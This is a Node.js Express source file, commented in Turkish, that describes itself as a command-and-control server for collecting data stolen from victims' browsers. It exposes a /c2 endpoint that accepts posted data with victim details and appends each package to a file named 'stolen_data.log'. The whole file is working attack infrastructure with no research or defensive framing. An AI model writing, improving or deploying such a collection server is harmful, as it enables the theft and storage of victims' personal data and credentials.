const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Gelen POST verilerini JSON olarak oku
app.use(express.json());
// public klasörünü statik dosyalar için sun
app.use(express.static('public'));

// --- VERİ TOPLAMA ENDPOINT'i (C2 Sunucusu) ---
// Tarayıcıdan çalınan tüm veriler buraya gelecek
app.post('/c2', (req, res) => {
    const { type, data, victimInfo } = req.body;
    
    // Gelen veriyi bir log dosyasına yaz
    const logEntry = `
===== YENI VERI PAKETI GELDI =====
Tip: ${type || 'Bilinmeyen'}
Kurban Bilgisi: ${JSON.stringify(victimInfo, null, 2)}
Zaman: ${new Date().toISOString()}
---
Veri Detaylari:
${JSON.stringify(data, null, 2)}
=================================
`;

    fs.appendFile('stolen_data.log', logEntry, (err) => {
        if (err) {
            console.error("Veri yazma hatası:", err);
            return res.status(500).json({ status: 'error', message: 'Sunucu hatası.' });
        }
        console.log(`Yeni veri alındı: ${type}`);
        res.json({ status: 'success', message: 'Veri alındı.' });
    });
});

// Sunucuyu başlat
app.listen(PORT, () => console.log(`C2 Sunucusu ${PORT} portunda çalışıyor...`));
